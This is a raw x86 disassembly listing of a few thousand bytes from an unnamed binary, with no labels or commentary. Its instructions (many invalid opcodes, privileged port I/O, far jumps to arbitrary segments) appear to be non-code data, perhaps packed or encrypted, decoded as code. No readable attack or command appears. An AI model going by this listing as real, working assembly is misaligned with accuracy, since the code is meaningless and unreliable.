  414ede:	(bad)  
  414edf:	aad    0x6e
  414ee1:	push   ecx
  414ee2:	mov    ecx,0x3e6ba391
  414ee7:	jmp    0x3fbd:0x1cca7552
  414eee:	xchg   esp,eax
  414eef:	jle    0x414f29
  414ef1:	mov    eax,0xbc862754
  414ef6:	jns    0x414ea8
  414ef8:	dec    eax
  414ef9:	(bad)  
  414efa:	iret   
  414efb:	push   ecx
  414efc:	test   al,dh
  414efe:	repz cmp ch,al
  414f01:	push   0x6201a9fc
  414f06:	shl    DWORD PTR [edx],1
  414f08:	cdq    
  414f09:	imul   ebp,DWORD PTR [ebx+esi*8-0x45],0x606605c4
  414f11:	test   eax,0xed2c4747
  414f16:	lea    edi,[ebx-0x65960b30]
  414f1c:	mov    ebx,0x3a0f5226
  414f21:	push   ds
  414f22:	inc    ebp
  414f23:	add    eax,0xe8c6efbc
  414f28:	fnstcw WORD PTR [edx+ebx*8]
  414f2b:	inc    ebx
  414f2c:	mov    ecx,0xbbdd36c
  414f31:	inc    esp
  414f32:	xor    ch,BYTE PTR [edx]
  414f34:	out    0x4,al
  414f36:	mov    edx,0x496a13e7
  414f3b:	loop   0x414f3c
  414f3d:	push   esi
  414f3e:	xchg   esi,eax
  414f3f:	jmp    DWORD PTR [edx]
  414f41:	retf   
  414f42:	les    esp,FWORD PTR [edi+0x29]
  414f45:	mov    eax,0xd7417ca1
  414f4a:	hlt    
  414f4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f4c:	jmp    0xec70f505
  414f51:	xor    BYTE PTR [eax-0x24],ah
  414f54:	inc    edi
  414f55:	jmp    0x414f9f
  414f57:	cmp    eax,0xf8a85fb4
  414f5c:	jnp    0x414f07
  414f5e:	push   0xffffff9a
  414f60:	dec    edx
  414f61:	int    0x5d
  414f63:	xchg   BYTE PTR [esi+0x54],cl
  414f66:	in     eax,dx
  414f67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f68:	sub    DWORD PTR [edx+0x51],ecx
  414f6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f6c:	inc    esp
  414f6d:	test   al,0x7a
  414f6f:	push   0x3f
  414f71:	ins    DWORD PTR es:[edi],dx
  414f72:	(bad)  
  414f73:	call   0x47ee66d
  414f78:	add    dh,BYTE PTR [ebx+0x61]
  414f7b:	ins    DWORD PTR es:[edi],dx
  414f7c:	iret   
  414f7d:	cmp    edx,ecx
  414f7f:	and    al,0x38
  414f81:	cld    
  414f82:	cmp    ah,dl
  414f84:	hlt    
  414f85:	out    dx,eax
  414f86:	adc    BYTE PTR [esi],ch
  414f88:	repz or eax,0xc3856e87
  414f8e:	stos   DWORD PTR es:[edi],eax
  414f8f:	inc    edx
  414f90:	mov    ds:0x91fe08a0,al
  414f95:	rcr    DWORD PTR [edx-0x2d2afb8e],1
  414f9b:	dec    ecx
  414f9c:	push   0xffffff80
  414f9e:	sbb    ebx,DWORD PTR [ecx-0x7398512d]
  414fa4:	stc    
  414fa5:	cmp    edi,DWORD PTR [ecx]
  414fa7:	sbb    al,0x37
  414fa9:	repz lahf 
  414fab:	cmp    bh,dl
  414fad:	iret   
  414fae:	jnp    0x414f9c
  414fb0:	(bad)  [ebx-0x6c]
  414fb3:	cmp    BYTE PTR [ebx+0x12dc2d0f],0x60
  414fba:	ret    
  414fbb:	leave  
  414fbc:	mov    ebp,0xfd379efa
  414fc1:	pop    edi
  414fc2:	jno    0x414f80
  414fc4:	out    dx,al
  414fc5:	push   0x1a
  414fc7:	arpl   dx,dx
  414fc9:	push   es
  414fca:	pop    esi
  414fcb:	xor    eax,0x7734e2b0
  414fd0:	mov    dh,0xe4
  414fd2:	jle    0x414f7b
  414fd4:	jl     0x41502a
  414fd6:	int3   
  414fd7:	jo     0x414f60
  414fd9:	jle    0x414ff2
  414fdb:	xchg   edi,eax
  414fdc:	pusha  
  414fdd:	mov    ds:0xf13a2f8f,eax
  414fe2:	xor    al,0x24
  414fe4:	sub    al,0x77
  414fe6:	mov    bl,0x1
  414fe8:	xchg   edx,eax
  414fe9:	ss dec edi
  414feb:	mov    ds:0x30ad9956,al
  414ff0:	ss ja  0x41505e
  414ff3:	pop    ebx
  414ff4:	aam    0xc1
  414ff6:	mov    eax,0x67d97249
  414ffb:	test   BYTE PTR [edi-0x795e2bec],ch
  415001:	or     ecx,DWORD PTR [edi]
  415003:	arpl   WORD PTR [esi],dx
  415005:	sub    bl,bh
  415007:	(bad)  
  415008:	scas   eax,DWORD PTR es:[edi]
  415009:	pop    esp
  41500a:	mov    dl,0xc4
  41500c:	push   0xfffffffb
  41500e:	push   0xffffff85
  415010:	jnp    0x414f93
  415012:	add    ebp,DWORD PTR [esi-0x75]
  415015:	gs sbb al,0xe0
  415018:	inc    edx
  415019:	push   eax
  41501a:	cmp    ebx,DWORD PTR [edi+0x42]
  41501d:	pushf  
  41501e:	cmp    edi,edi
  415020:	add    al,0x5e
  415022:	ss loopne 0x415091
  415025:	sahf   
  415026:	and    BYTE PTR [ebx+0xc],cl
  415029:	adc    dl,BYTE PTR [ebx+0x7f75f82f]
  41502f:	imul   eax,DWORD PTR [ebx-0x16],0x44ecf046
  415036:	mov    edx,0x29bac5c0
  41503b:	and    eax,0x423d4add
  415040:	cli    
  415041:	or     esp,DWORD PTR [ecx-0x62]
  415044:	repz cld 
  415046:	jmp    0x8ace:0x3b1363ab
  41504d:	jno    0x414ff9
  41504f:	pop    ss
  415050:	clc    
  415051:	xchg   edx,eax
  415052:	dec    ebp
  415053:	inc    edi
  415054:	xchg   DWORD PTR [ebp-0x57],esp
  415057:	pop    esp
  415058:	fwait
  415059:	inc    esp
  41505a:	lock or DWORD PTR [edx],ebx
  41505d:	cmp    BYTE PTR [eax-0x3d],dh
  415060:	ds push edi
  415062:	jecxz  0x4150d0
  415064:	stos   DWORD PTR es:[edi],eax
  415065:	adc    DWORD PTR [edi],eax
  415067:	shl    DWORD PTR [ebx*4-0x3ed1583f],1
  41506e:	(bad)  
  41506f:	dec    esi
  415070:	stc    
  415071:	jmp    0x631568f7
  415076:	call   DWORD PTR [ecx+esi*8]
  415079:	cmp    BYTE PTR [edi-0x4],dh
  41507c:	jo     0x41505e
  41507e:	test   al,0x7e
  415080:	out    dx,al
  415081:	xchg   esp,eax
  415082:	outs   dx,BYTE PTR ds:[esi]
  415083:	mov    al,0x76
  415085:	in     al,0x96
  415087:	push   esi
  415088:	imul   esi,DWORD PTR [ebx-0x5d4d1f6f],0x7b
  41508f:	mov    ecx,0x95202f4c
  415094:	pusha  
  415095:	stos   BYTE PTR es:[edi],al
  415096:	clc    
  415097:	mov    esi,0xd927120
  41509c:	sbb    al,0xf0
  41509e:	loope  0x415083
  4150a0:	shr    BYTE PTR [ecx],0x3f
  4150a3:	push   edi
  4150a4:	js     0x4150b9
  4150a6:	sbb    ch,bl
  4150a8:	jmp    0x415039
  4150aa:	cli    
  4150ab:	sub    DWORD PTR [edx],ebx
  4150ad:	fldl2t 
  4150af:	out    dx,al
  4150b0:	jge    0x4150c2
  4150b2:	jbe    0x41510b
  4150b4:	add    edx,DWORD PTR [ebp+0x3c]
  4150b7:	out    dx,eax
  4150b8:	or     eax,0x47cd7e2c
  4150bd:	test   DWORD PTR [eax+0x4970e4fd],0x60880c7d
  4150c7:	pop    edi
  4150c8:	mov    ah,0x82
  4150ca:	xor    eax,0xe8e3df2c
  4150cf:	push   ebx
  4150d0:	dec    eax
  4150d1:	pop    ebp
  4150d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150d3:	cld    
  4150d4:	sbb    dl,ah
  4150d6:	ret    0x9844
  4150d9:	jp     0x415114
  4150db:	sbb    DWORD PTR [edi+0x69],esi
  4150de:	bound  ebx,QWORD PTR [ebx-0x2d4f03ef]
  4150e4:	push   0xecdc63ae
  4150e9:	and    al,0xaa
  4150eb:	jbe    0x415153
  4150ed:	in     eax,dx
  4150ee:	pop    eax
  4150ef:	xchg   edx,eax
  4150f0:	pop    ds
  4150f1:	add    eax,edx
  4150f3:	repz mov eax,0x1cdedd8f
  4150f9:	mov    dl,0xeb
  4150fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150fc:	aam    0x91
  4150fe:	lods   eax,DWORD PTR ds:[esi]
  4150ff:	in     eax,dx
  415100:	xor    eax,0xe557c1cd
  415105:	pop    es
  415106:	outs   dx,DWORD PTR ds:[esi]
  415107:	and    DWORD PTR [ecx],esi
  415109:	(bad)  
  41510a:	or     eax,0x1da3a708
  41510f:	lock ret 
  415111:	cli    
  415112:	(bad)  
  415113:	out    dx,al
  415114:	cmp    eax,DWORD PTR [ebx+edx*4+0x49479c43]
  41511b:	pushf  
  41511c:	push   0x75
  41511e:	inc    ebp
  41511f:	stos   DWORD PTR es:[edi],eax
  415120:	mov    ds:0x527d4ff6,al
  415125:	xor    esi,eax
  415127:	jl     0x41513f
  415129:	fidiv  WORD PTR [eax-0x22c4d60e]
  41512f:	sahf   
  415130:	aad    0x62
  415132:	inc    DWORD PTR [ebp+ecx*8+0x73]
  415136:	pop    edi
  415137:	cmp    BYTE PTR ds:0x961f498f,ch
  41513d:	dec    eax
  41513e:	je     0x4150d2
  415140:	test   BYTE PTR [esi+ebp*4-0x38],dl
  415144:	shl    ecx,0x45
  415147:	shl    ah,cl
  415149:	or     DWORD PTR [ebx+edx*2+0x39807674],0xfcc169a2
  415154:	cmp    ch,dh
  415156:	mov    edi,0x981c2fbe
  41515b:	test   DWORD PTR [edx+0xf63b419],eax
  415161:	(bad)  
  415162:	mov    dh,0xb8
  415164:	xchg   esi,eax
  415165:	fsubp  st(7),st
  415167:	leave  
  415168:	int    0xb5
  41516a:	(bad)  
  41516b:	bound  ebp,QWORD PTR [edx+0x16]
  41516e:	mov    BYTE PTR [edx+0x45ead86d],dl
  415174:	dec    esi
  415175:	test   BYTE PTR [ebx+0x16],cl
  415178:	ss dec edi
  41517a:	mov    ch,0x53
  41517c:	fcom   QWORD PTR [edi]
  41517e:	sahf   
  41517f:	idiv   DWORD PTR [eax+ebx*4]
  415182:	fldcw  WORD PTR [ebx-0x4677263a]
  415188:	adc    dl,al
  41518a:	popf   
  41518b:	fisttp DWORD PTR [esp+ebp*2+0x54]
  41518f:	pop    ecx
  415190:	pop    ss
  415191:	mov    eax,0xdeee0e58
  415196:	cwde   
  415197:	pop    ebx
  415198:	jge    0x41519e
  41519a:	inc    esp
  41519b:	jg     0x4151d9
  41519d:	in     eax,dx
  41519e:	mov    edi,0x3a96eb71
  4151a3:	(bad)  
  4151a5:	icebp  
  4151a6:	xor    ch,BYTE PTR [ebx]
  4151a8:	cdq    
  4151a9:	mov    ecx,0xbcaee816
  4151ae:	scas   eax,DWORD PTR es:[edi]
  4151af:	rol    DWORD PTR [ecx+0x44],0xc7
  4151b3:	out    dx,al
  4151b4:	mov    ebx,0xc59347d6
  4151b9:	call   0xd2a1c71d
  4151be:	add    eax,0x4e0f1da9
  4151c3:	mov    ds:0x93cb61c8,al
  4151c8:	jmp    0x415242
  4151ca:	lds    ebx,FWORD PTR [ebx-0x1e]
  4151cd:	add    BYTE PTR [edx],dl
  4151cf:	or     ebx,DWORD PTR ss:[edi+ecx*4]
  4151d3:	xchg   dl,bh
  4151d5:	pusha  
  4151d6:	push   es
  4151d7:	mov    ecx,0xd52c79c0
  4151dc:	aas    
  4151dd:	shl    BYTE PTR [edx],0x53
  4151e0:	clc    
  4151e1:	mov    BYTE PTR [esi-0x2978bd18],ch
  4151e7:	fidivr DWORD PTR [ecx+ebx*4-0x3811f91f]
  4151ee:	in     al,0xba
  4151f0:	pop    ebx
  4151f1:	adc    eax,DWORD PTR [ebx+ebx*4]
  4151f4:	call   0x500faac7
  4151f9:	jne    0x41525c
  4151fb:	dec    ebp
  4151fc:	jne    0x4151a9
  4151fe:	cmc    
  4151ff:	jecxz  0x415260
  415201:	or     bh,ch
  415203:	mov    eax,ds:0x6dbc9415
  415208:	adc    al,0xfc
  41520a:	in     al,0xd2
  41520c:	mov    edx,0xadbd1be6
  415211:	sub    eax,0xe719f29
  415216:	outs   dx,BYTE PTR ds:[esi]
  415217:	cmp    ah,BYTE PTR [ebx-0x4e]
  41521a:	in     al,0x89
  41521c:	fild   WORD PTR [esi-0x2302fa13]
  415222:	xor    DWORD PTR [esi],0xc46be67a
  415228:	pop    esi
  415229:	dec    ebx
  41522a:	daa    
  41522b:	setl   dl
  41522e:	push   esp
  41522f:	push   edx
  415230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415232:	jge    0x4151ea
  415234:	das    
  415235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415236:	fstp   st(2)
  415238:	mov    esi,0x9f11c691
  41523d:	jmp    0x4152b5
  41523f:	pop    esi
  415240:	das    
  415241:	or     BYTE PTR ds:0xa3fbd049,cl
  415247:	into   
  415248:	pop    es
  415249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41524a:	shl    BYTE PTR [esp+eax*1-0x8],cl
  41524e:	pop    edi
  41524f:	ror    DWORD PTR [esi+esi*2+0x21],cl
  415253:	sub    DWORD PTR [eax-0xe8372c9],esp
  415259:	loopne 0x41524c
  41525b:	xor    ecx,DWORD PTR [edx-0x7b6af0d1]
  415261:	sub    al,0xd1
  415263:	fcom   QWORD PTR [ecx+0x792a31db]
  415269:	stos   BYTE PTR es:[edi],al
  41526a:	ja     0x415231
  41526c:	mov    ebp,0x71981637
  415271:	xchg   edi,eax
  415272:	sti    
  415273:	dec    ebx
  415274:	mov    al,ds:0x2827282c
  415279:	or     eax,0x2bc02623
  41527e:	fidiv  WORD PTR ds:[edx-0x79]
  415282:	arpl   WORD PTR ds:0xd6d9a6b8,si
  415288:	dec    ecx
  415289:	aaa    
  41528a:	pop    ds
  41528b:	and    dl,cl
  41528d:	cld    
  41528e:	retf   
  41528f:	mov    ch,0x3b
  415291:	mov    esi,0xc2179638
  415296:	aaa    
  415297:	repnz mov BYTE PTR [ebp+0x21],ch
  41529b:	hlt    
  41529c:	call   DWORD PTR [edx-0x172e4731]
  4152a2:	inc    ecx
  4152a3:	imul   BYTE PTR [ecx+0x54]
  4152a6:	sbb    ch,dl
  4152a8:	enter  0x98ea,0x53
  4152ac:	dec    ecx
  4152ad:	or     bl,dh
  4152af:	aad    0xcb
  4152b1:	inc    edi
  4152b2:	cwde   
  4152b3:	fs cld 
  4152b5:	add    DWORD PTR [esi+edx*4+0x2f],eax
  4152b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152ba:	xchg   ebx,eax
  4152bb:	mov    ecx,0xabf0fdef
  4152c0:	out    dx,eax
  4152c1:	mov    ebx,0xbbd6c76
  4152c6:	pop    edx
  4152c7:	out    0x58,eax
  4152c9:	out    0x55,al
  4152cb:	sbb    eax,0x7ede172e
  4152d0:	movlps xmm6,QWORD PTR [ebp+ebp*1-0x34]
  4152d5:	xchg   edi,eax
  4152d6:	or     BYTE PTR fs:[edx+0x43],al
  4152da:	cmp    eax,ebp
  4152dc:	enter  0x5b35,0x87
  4152e0:	or     BYTE PTR [ecx+0x3c1161a4],0x9c
  4152e7:	inc    esi
  4152e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152e9:	xor    BYTE PTR [eax+0x6d],bl
  4152ec:	rol    BYTE PTR [ecx],cl
  4152ee:	aaa    
  4152ef:	jecxz  0x4152f8
  4152f1:	mov    edi,0x830dfca
  4152f6:	inc    ebp
  4152f7:	stos   DWORD PTR es:[edi],eax
  4152f8:	xchg   edx,eax
  4152f9:	sub    DWORD PTR [edi-0x13],0x25
  4152fd:	rol    BYTE PTR [eax-0x6870afb0],cl
  415303:	scas   eax,DWORD PTR es:[edi]
  415304:	ins    BYTE PTR es:[edi],dx
  415305:	jp     0x4152d4
  415307:	pop    es
  415308:	imul   eax,DWORD PTR [edx],0xd0794595
  41530e:	xor    eax,ecx
  415310:	mov    bl,0x12
  415312:	push   ebp
  415313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415314:	pop    ss
  415315:	jae    0x4152a0
  415317:	dec    edx
  415318:	sbb    al,0x6a
  41531a:	or     edx,DWORD PTR [ebp-0x7f]
  41531d:	mov    BYTE PTR [ebp-0x4fe7292],al
  415323:	cmp    ebp,ebp
  415325:	cmp    DWORD PTR [edx+0x7],0x71
  415329:	xlat   BYTE PTR ds:[ebx]
  41532a:	and    al,0xb8
  41532c:	in     eax,0xd5
  41532e:	xchg   edi,eax
  41532f:	cmp    al,0x56
  415331:	inc    ebx
  415332:	(bad)  
  415333:	push   eax
  415334:	pop    es
  415335:	bound  eax,QWORD PTR [ebx+0x608bd5cc]
  41533b:	push   esp
  41533c:	ror    BYTE PTR [edi+0x89ea0eb],cl
  415342:	lock fstp st(5)
  415345:	into   
  415346:	fist   DWORD PTR [ebp-0x11]
  415349:	cmp    DWORD PTR [edi-0x44],edi
  41534c:	mov    dl,cl
  41534e:	and    BYTE PTR ds:0x49eaffde,bl
  415354:	mov    dh,0xf5
  415356:	sub    DWORD PTR [edx],esi
  415358:	xchg   ecx,eax
  415359:	mov    eax,ds:0x8633fc3
  41535e:	fimul  DWORD PTR [esi+0x1c]
  415361:	pop    es
  415362:	div    BYTE PTR [edx+0x35686ac7]
  415368:	mov    WORD PTR fs:[edx],ds
  41536b:	mov    BYTE PTR [ebp+0x38182f34],dh
  415371:	nop
  415372:	inc    esp
  415373:	mov    DWORD PTR [ecx*1-0x7e561ea0],eax
  41537a:	cmp    DWORD PTR [edi+0x1e187929],edi
  415380:	mov    BYTE PTR [ecx],cl
  415382:	mov    ah,0xa
  415384:	xchg   esp,eax
  415385:	adc    al,0x6
  415387:	ja     0x4153fc
  415389:	xchg   ecx,eax
  41538a:	push   ecx
  41538b:	dec    esp
  41538c:	cmp    bl,dh
  41538e:	and    DWORD PTR [eax],ebp
  415390:	xor    eax,0x105a4245
  415395:	into   
  415396:	loopne 0x4153c2
  415398:	imul   eax,DWORD PTR [eax],0x9917e1e2
  41539e:	ja     0x4153c7
  4153a0:	stos   DWORD PTR es:[edi],eax
  4153a1:	dec    esp
  4153a2:	js     0x4153c7
  4153a4:	iret   
  4153a5:	scas   eax,DWORD PTR es:[edi]
  4153a6:	push   ebx
  4153a7:	mov    ds:0x855181c,al
  4153ac:	cmp    DWORD PTR [ecx+0x31],edi
  4153af:	arpl   bx,sp
  4153b1:	pop    ebp
  4153b2:	daa    
  4153b3:	push   cs
  4153b4:	dec    eax
  4153b5:	(bad)
  4153b8:	(bad)  
  4153b9:	jmp    0x4153c5
  4153bb:	push   bp
  4153bd:	sar    BYTE PTR [ebp-0x6e],cl
  4153c0:	push   ds
  4153c1:	lock repnz rcr ah,cl
  4153c5:	xchg   BYTE PTR [eax-0x47],dh
  4153c8:	fnstsw WORD PTR [edx+0x2b]
  4153cb:	vzeroall 
  4153ce:	adc    esi,DWORD PTR [ebp+eax*8-0x73]
  4153d2:	(bad)  
  4153d3:	push   esi
  4153d4:	mov    ds:0x4519ea35,al
  4153d9:	fld    DWORD PTR [esi]
  4153db:	lahf   
  4153dc:	jecxz  0x4153cc
  4153de:	or     eax,0x548e5840
  4153e3:	push   ss
  4153e4:	into   
  4153e5:	call   0x3cae:0x884addc1
  4153ec:	je     0x4153b5
  4153ee:	xor    BYTE PTR [edi-0x25],bl
  4153f1:	inc    edx
  4153f2:	sbb    cl,BYTE PTR [ecx]
  4153f4:	int3   
  4153f5:	push   0x70
  4153f7:	imul   esi
  4153f9:	loope  0x4153da
  4153fb:	dec    ebx
  4153fc:	jo     0x4153cb
  4153fe:	xchg   edx,eax
  4153ff:	out    dx,al
  415400:	mov    esp,0x80ce0b29
  415405:	fsubr  st,st(2)
  415407:	icebp  
  415408:	in     al,dx
  415409:	stos   BYTE PTR es:[edi],al
  41540a:	push   ds
  41540b:	xchg   DWORD PTR [ebx+0x43ee1cd4],esi
  415411:	sbb    dh,bl
  415413:	mov    bl,0x60
  415415:	pop    esp
  415416:	mov    esi,0xed75e059
  41541b:	fs (bad) 
  41541d:	push   edx
  41541e:	push   0xeda7d42d
  415423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415424:	jmp    0xc44:0x1c0c11e5
  41542b:	(bad)  
  41542c:	repz dec eax
  41542e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41542f:	and    eax,0xe975260c
  415434:	jno    0x41543e
  415436:	adc    BYTE PTR [edx+0x644dcc02],0x24
  41543d:	xchg   BYTE PTR fs:[esi-0x75725a56],bh
  415444:	pop    ebx
  415445:	and    al,0x22
  415447:	mov    ah,0xf
  415449:	repz jecxz 0x415486
  41544c:	xor    cl,bl
  41544e:	lahf   
  41544f:	sub    cl,0x8c
  415452:	mov    dl,0x50
  415454:	or     dl,0x67
  415457:	scas   eax,DWORD PTR es:[edi]
  415458:	sub    edi,DWORD PTR [edi+eiz*1]
  41545b:	jmp    0x423f:0x5302a569
  415462:	sbb    DWORD PTR [ecx-0x72],esp
  415465:	push   eax
  415466:	in     al,0x64
  415468:	ret    
  415469:	push   ss
  41546a:	sbb    al,0x87
  41546c:	lods   al,BYTE PTR ds:[esi]
  41546d:	add    eax,0x45620a88
  415472:	xor    ah,ah
  415474:	arpl   WORD PTR [eax+0x437cb520],cx
  41547a:	test   al,0xf4
  41547c:	stos   DWORD PTR es:[edi],eax
  41547d:	in     al,dx
  41547e:	out    0xa2,al
  415480:	inc    ebp
  415481:	in     al,0x2e
  415483:	or     dh,BYTE PTR [edx+0x49]
  415486:	or     BYTE PTR [esi+esi*4],ch
  415489:	sbb    BYTE PTR [edx],ch
  41548b:	repnz test BYTE PTR [ebp-0x17],dl
  41548f:	mov    esi,0x9573a88
  415494:	stos   BYTE PTR es:[edi],al
  415495:	cmp    ch,ah
  415497:	mov    ch,0x4b
  415499:	mov    al,0x72
  41549b:	mov    dl,0x1a
  41549d:	push   esp
  41549e:	imul   edi,DWORD PTR [ebp-0x22394e11],0xa9b270f3
  4154a8:	bound  ebx,QWORD PTR [ebp+esi*8+0x32]
  4154ac:	cli    
  4154ad:	out    dx,al
  4154ae:	inc    eax
  4154af:	test   eax,0x5daa2412
  4154b4:	mov    dl,0x39
  4154b6:	pop    ds
  4154b7:	mov    edi,0x8c4763f7
  4154bc:	and    al,BYTE PTR [edx]
  4154be:	call   0x42fb:0xddd12e01
  4154c5:	adc    eax,0xa11a9f1d
  4154ca:	jp     0x4154fe
  4154cc:	int3   
  4154cd:	sub    bl,BYTE PTR [edi+0x1]
  4154d0:	or     eax,0xc785e62d
  4154d5:	loope  0x415501
  4154d7:	sub    eax,0x30e26187
  4154dc:	mov    ds:0x6e06964b,eax
  4154e1:	aas    
  4154e2:	mov    ds:0x686648fc,eax
  4154e7:	shl    BYTE PTR [ecx+0x65],cl
  4154ea:	pop    esi
  4154eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154ec:	xchg   esi,eax
  4154ed:	mov    dh,0x7d
  4154ef:	pop    es
  4154f0:	push   edx
  4154f1:	cmp    al,cl
  4154f3:	sbb    ebp,DWORD PTR [edx+edx*4+0x6ba7557d]
  4154fa:	add    eax,0xdd8d5c51
  4154ff:	rcr    BYTE PTR [ebx+0x6a6acda2],cl
  415505:	add    cl,BYTE PTR [ebp+0xcf0fe7b]
  41550b:	mov    esi,0x21e93b62
  415510:	ds adc ecx,ebp
  415513:	cmp    DWORD PTR [eax-0x30b7e3a2],eax
  415519:	mov    DWORD PTR [edi],esi
  41551b:	dec    edx
  41551c:	mov    bh,0x3b
  41551e:	cmp    BYTE PTR [eax+0x63],bh
  415521:	push   eax
  415522:	adc    al,0x84
  415524:	into   
  415525:	data16 (bad) 
  415527:	push   cs
  415528:	ret    0x4abd
  41552b:	loopne 0x415562
  41552d:	inc    eax
  41552e:	cdq    
  41552f:	jo     0x41557b
  415531:	aas    
  415532:	fisttp QWORD PTR [ebp-0x46]
  415535:	fisubr DWORD PTR [ebx+0x66]
  415538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415539:	push   edx
  41553a:	rep lods al,BYTE PTR ds:[esi]
  41553c:	xor    eax,DWORD PTR [ebx+0x1300a576]
  415542:	cmc    
  415543:	jnp    0x4155b2
  415545:	push   ecx
  415546:	out    dx,eax
  415547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415548:	call   0x341df7df
  41554d:	sbb    edi,DWORD PTR [edx+0x39]
  415550:	mov    esi,0x866afca
  415555:	(bad)  
  415557:	std    
  415558:	hlt    
  415559:	das    
  41555a:	push   ebx
  41555b:	aas    
  41555c:	test   ah,ah
  41555e:	and    BYTE PTR [ebp-0x28],al
  415561:	repnz mov WORD PTR fs:[esi],cs
  415565:	mov    al,ds:0x3f96a9b3
  41556a:	push   edx
  41556b:	adc    bh,dh
  41556d:	popf   
  41556e:	imul   ebx,edx,0x63
  415571:	inc    ebx
  415572:	push   edi
  415573:	out    dx,eax
  415574:	das    
  415575:	mov    ah,0xa
  415577:	repz daa 
  415579:	fsubr  DWORD PTR [ebp+0x36]
  41557c:	cmp    BYTE PTR [edi-0x7afb9493],0xe6
  415583:	and    DWORD PTR [ecx-0x45f8125],ebx
  415589:	fld    DWORD PTR [edi+edi*2-0x495080]
  415590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415591:	mov    BYTE PTR [edx+ecx*1],0xf8
  415595:	adc    eax,0x306e9d66
  41559a:	push   es
  41559b:	aaa    
  41559c:	mov    ds:0x9845ab1c,eax
  4155a1:	cld    
  4155a2:	pop    edx
  4155a3:	aaa    
  4155a4:	pop    ecx
  4155a5:	xchg   esp,eax
  4155a6:	into   
  4155a7:	push   0xffffff8f
  4155a9:	jmp    0xb46e:0xe2d442e9
  4155b0:	pop    es
  4155b1:	lahf   
  4155b2:	or     al,0x72
  4155b4:	push   cs
  4155b5:	jo     0x415619
  4155b7:	xor    al,0x2c
  4155b9:	inc    eax
  4155ba:	movsx  ebp,WORD PTR [edx-0x21]
  4155be:	xor    eax,DWORD PTR [edx-0x52]
  4155c1:	add    edx,ecx
  4155c3:	adc    edx,0xa2780cfe
  4155c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155ca:	inc    edx
  4155cb:	and    DWORD PTR [ebp-0x40],eax
  4155ce:	cmp    eax,0x1e1c61fa
  4155d3:	add    dh,BYTE PTR [ebx-0x53]
  4155d6:	test   DWORD PTR [edi+eiz*1-0x573132d],0x37feebbb
  4155e1:	fidiv  DWORD PTR [edx]
  4155e3:	inc    edi
  4155e4:	sbb    DWORD PTR [edx],ecx
  4155e6:	or     al,0xdc
  4155e8:	(bad)  
  4155ea:	icebp  
  4155eb:	dec    edx
  4155ec:	imul   DWORD PTR [eax+0x7e93f393]
  4155f2:	ins    BYTE PTR es:[edi],dx
  4155f3:	cmp    ebp,esp
  4155f5:	pop    esi
  4155f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155f7:	shl    BYTE PTR [edx],cl
  4155f9:	outs   dx,DWORD PTR ds:[esi]
  4155fa:	ins    DWORD PTR es:[edi],dx
  4155fb:	jg     0x4155e2
  4155fd:	mov    edx,0x4a755a46
  415602:	add    DWORD PTR [edi-0x7c],esi
  415605:	in     eax,0x11
  415607:	int    0x8e
  415609:	inc    ecx
  41560a:	je     0x4155c2
  41560c:	adc    esi,DWORD PTR [ecx]
  41560e:	arpl   WORD PTR [edx+0x75],si
  415611:	xor    esi,ebx
  415613:	hlt    
  415614:	pop    edx
  415615:	sub    ah,bh
  415617:	test   al,0xb5
  415619:	mov    BYTE PTR [eax+0x1b09abad],cl
  41561f:	int3   
  415620:	lea    ecx,[eax]
  415622:	add    eax,0x9f79b885
  415627:	call   0x2030:0xce105c1e
  41562e:	mov    dl,0x4b
  415630:	cdq    
  415631:	sbb    ch,BYTE PTR [esi-0x3563e937]
  415637:	pop    ebp
  415638:	jp     0x41560a
  41563a:	push   cs
  41563b:	dec    esi
  41563c:	jp     0x4155e2
  41563e:	pop    ds
  41563f:	sbb    eax,ebp
  415641:	inc    ebp
  415642:	mov    cl,0xf1
  415644:	fwait
  415645:	cwde   
  415646:	pop    eax
  415647:	adc    eax,eax
  415649:	popf   
  41564a:	call   0xb64c:0x4fb2f1b7
  415651:	xchg   ebp,eax
  415652:	push   ebp
  415653:	clc    
  415654:	inc    esp
  415655:	test   BYTE PTR [esi],bl
  415657:	mov    eax,ds:0x8234ca0d
  41565c:	jo     0x4156bf
  41565e:	fxch   st(3)
  415660:	gs adc eax,0x437455cd
  415666:	push   es
  415667:	loop   0x41567f
  415669:	into   
  41566a:	push   0xffffffc9
  41566c:	sbb    BYTE PTR [edx+0x78],ah
  41566f:	int3   
  415670:	sbb    al,bl
  415672:	(bad)  
  415673:	pop    ss
  415674:	inc    ecx
  415675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415676:	imul   edi
  415678:	mov    al,0x6a
  41567a:	cmp    eax,0xc9b5d666
  41567f:	sub    ah,ch
  415681:	(bad)  
  415682:	and    al,0xf0
  415684:	js     0x415619
  415686:	shufps xmm6,XMMWORD PTR [ebp-0x26],0xb3
  41568b:	neg    BYTE PTR [esi-0x4702d292]
  415691:	mov    al,ds:0xb690ccc7
  415696:	pop    ebx
  415697:	sub    BYTE PTR ds:0x6f0b6b75,cl
  41569d:	ret    0xba5
  4156a0:	cmp    BYTE PTR [ecx],ah
  4156a2:	and    DWORD PTR [edi],ebp
  4156a4:	or     ebx,ebp
  4156a6:	into   
  4156a7:	ins    DWORD PTR es:[edi],dx
  4156a8:	xchg   esi,eax
  4156a9:	xchg   edx,eax
